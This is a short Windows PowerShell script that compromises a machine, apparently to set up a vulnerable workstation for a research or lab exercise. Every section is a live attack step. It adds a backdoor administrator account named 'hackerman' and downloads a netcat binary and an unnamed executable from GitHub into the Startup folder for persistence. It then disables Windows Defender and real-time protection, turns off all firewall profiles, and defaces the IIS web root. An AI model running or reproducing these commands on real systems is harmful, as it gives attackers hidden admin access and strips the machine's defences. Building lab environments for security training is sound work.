# add malicious user
net user hackerman "password" /add
Add-LocalGroupMember -Group "Administrators" -Member "hackerman"

# download nc backdoor to startup folder
curl "https://github.com/int0x33/nc.exe/raw/refs/heads/master/nc.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\nc.exe"
curl “https://github.com/cleverbear57/AI-Research-Project/raw/refs/heads/main/Windows%2010%20Workstation/script.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\script.exe"

# disable windows defender and real-time protection
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Force | Out-Null
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender" -Name "DisableAntiSpyware" -Value 1 -Type DWord
New-Item -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Force
Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" -Name "DisableRealtimeMonitoring" -Value 1 -Type DWord

# disable all firewall profiles
Set-NetFirewallProfile -Profile Domain,Private,Public -Enabled False

# deface the website
echo "YOU HAVE BEEN HACKED HEEHEHEHEHEHE" > C:/inetpub/wwwroot/index.php
